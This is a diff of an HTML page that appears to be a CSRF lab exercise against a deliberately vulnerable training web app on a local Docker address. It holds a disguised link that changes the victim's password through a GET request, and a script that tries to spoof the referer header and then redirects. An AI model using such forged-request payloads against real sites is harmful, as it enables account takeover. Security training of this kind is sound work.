@@ -1,24 +1,40 @@
 <!DOCTYPE html>
 <html>
+<head>
+	<meta charset="UTF-8">
+</head>
 <body>
 
-<h1>Low</h1>
+	<h1>Low</h1>
 
-<!--------------------------------------------------------------------->
+	<h3>&lt;a&gt; tag</h3>
 
-<h3>&lt;a&gt; tag</h3>
+	<a href="http://172.17.0.2/vulnerabilities/csrf/?password_new=password1&password_conf=password1&Change=Change">Link to click on</a>
 
-<a href="http://172.17.0.2/vulnerabilities/csrf/?password_new=pwda&password_conf=pwda&Change=Change">View the picture</a>
+	<!--------------------------------------------------------------------->
 
-<!--------------------------------------------------------------------->
+	<h3>&lt;img&gt; tag</h3>
 
-<h3>&lt;img&gt; tag</h3>
+	<a href="csrf-image.html">Link to page containing img tag</a>
 
-<a href="csrf-image.html">View the image</a>
+	<!--------------------------------------------------------------------->
 
-<!--------------------------------------------------------------------->
+	<h1>Medium</h1>
 
-<h1>Medium</h1>
+	<!--------------------------------------------------------------------->
 
+	<script>
+		newReferer = "172.17.0.2"
+		/*
+		javascript:(function(){ 
+			// var newReferer = prompt('Set the referer:');
+			Object.defineProperty(document, "referer", {configurable: true, get : function(){ return newReferer; }})
+		})();
+
+		console.log(document.referer)
+		*/
+
+		location.href = newReferer
+	</script>
 </body>
 </html>
